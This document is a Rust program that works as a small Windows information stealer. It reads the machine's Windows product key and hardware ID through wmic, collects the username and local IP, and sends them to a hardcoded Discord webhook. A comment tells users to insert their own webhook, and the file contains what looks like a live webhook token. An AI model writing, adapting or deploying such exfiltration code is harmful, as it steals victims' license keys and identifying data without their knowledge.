use reqwest::blocking::Client;
use serde_json::{json, Value};
use std::error::Error;
use std::net::{IpAddr, Ipv4Addr, TcpStream};
use std::process::Command;
use whoami;




fn get_local_ip_address() -> String {
    let socket = TcpStream::connect("google.com:80").unwrap();
    let ip_address = socket.local_addr().unwrap().ip();

    ip_address.to_string()
}

fn get_hwid() -> String {
    let output = Command::new("cmd")
        .args(&["/C", "wmic csproduct get uuid"])
        .output()
        .expect("Failed to execute command");

    let output_str = String::from_utf8_lossy(&output.stdout);
    let hwid = output_str.split("\n").collect::<Vec<&str>>()[1].trim().to_string();

    hwid
}

fn main() -> Result<(), Box<dyn Error>> {
    // Get windows key
    let output = Command::new("cmd")
        .args(&["/C", "wmic path softwarelicensingservice get OA3xOriginalProductKey"])
        .output()
        .expect("Failed to execute command");

    let output_str = String::from_utf8_lossy(&output.stdout);
    let key = output_str.split("\n").collect::<Vec<&str>>()[1].trim();
    // Get current users name
    let username = whoami::username();
    // Get ip Adress
    let ip_address = get_local_ip_address();
    // Get HWID
    let hwid = get_hwid();

    // REPLACE WEBHOOK_URL WITH YOUR OWN
    let webhook_url = "https://discord.com/api/webhooks/1094464012575572041/mG-IicpdGrV5Bn02VFx1deeeB6KT66UnCBuSzaL9eZB10gLEpf_TPlIbNMocAUb0aEts";
    let client = Client::new();
    let payload = json!({
        "username": "Honesty",
        "avatar_url": "https://cdn.discordapp.com/attachments/1094476147888234506/1094476267396550807/3_-_a_letter_A_with_lines_with_a_smoke_backgroun.png",
        "embeds": [{
            "title": "Hello from Rust!",
            "fields": [{
                "name": "Username",
                "value": format!("```{}```", username),
                "inline": true
            }, {
                "name": "IP Address",
                "value": format!("```{}```", ip_address),
                "inline": true
            }, {
                "name": "Windows Product Key",
                "value": format!("```{}```", key),
                "inline": true
            }, {
                "name": "HWID",
                "value": format!("```{}```", hwid),
                "inline": true
            }],
            "color": 15844367
        }]
    });

    let res = client.post(webhook_url).json(&payload).send()?;

    Ok(())
}
